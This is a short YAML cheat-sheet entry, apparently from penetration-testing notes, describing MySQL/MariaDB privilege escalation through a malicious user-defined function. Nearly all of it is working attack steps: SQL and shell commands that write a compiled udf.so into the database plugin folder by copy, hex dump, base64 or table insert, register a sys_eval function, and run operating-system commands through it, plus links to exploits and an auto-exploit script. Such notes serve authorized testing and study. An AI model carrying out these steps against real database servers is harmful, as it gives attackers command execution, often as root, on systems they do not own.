---
functions:
  privilege-escalation:
    - description: Simplistic and standard checklist for linux privilege escalation, in no particular order
      code: |
        Create a user-defined-function
        -------------------------------
        - [ ] Do you have write privileges to the db?
        - [ ] Is mysql running as root?
        - [ ] Can you locate the plugin folder?

        SHOW GRANTS;  <-- show privileges
        SHOW VARIABLES;  <-- find the plugin directory  (blank can mean default location of /usr/lib/)

        ===== STEP 1 =====
        Get your udf.so into the plugin folder

        Method 1: copy 
          Copy the udf.so into the plugin folder
        Method 2: perform a hexdump
          od -A n -t x1 lib_mysqludf_sys.so | sed 's/ *//g' | tr -d '\n' | xclip
          select <hex> into dumpfile "<plugin folder>/udf.so";
        Method 3: perform a base64 encoded  (IF MARIADB 5.6+)
          base64 <file> -w 0 > <file>.b64
          base64 -w 0 myudf.so > myudf.b64
          cat <file>.b64 | xclip

          set @lib = "<base64>";
          select from_base64(@lib) into dumpfile "<plugin folder>/udf.so";
        Method 4: transfer file via table inserts  (easiest)
          create table foo(line blob);insert into foo values(load_file('/tmp/myudf.so'));select * from foo into dumpfile "<plugin folder>/udf.so";

        ===== STEP 2 =====
        Create the user-defined function

        create function sys_eval returns string soname 'myudf.so';  (the function name may change depending on your UDF.so library)

        ===== STEP 3 =====
        Code execution

        select sys_eval('id');

resources : |
  https://www.exploit-db.com/exploits/50236
  https://www.exploit-db.com/papers/44139/
  https://github.com/mysqludf/lib_mysqludf_sys  <-- this is the udf file I used
  https://github.com/MidnightSeer/scripts/blob/master/auto-udf.sh  <-- auto exploit, do not use unless you understand all of the above
---

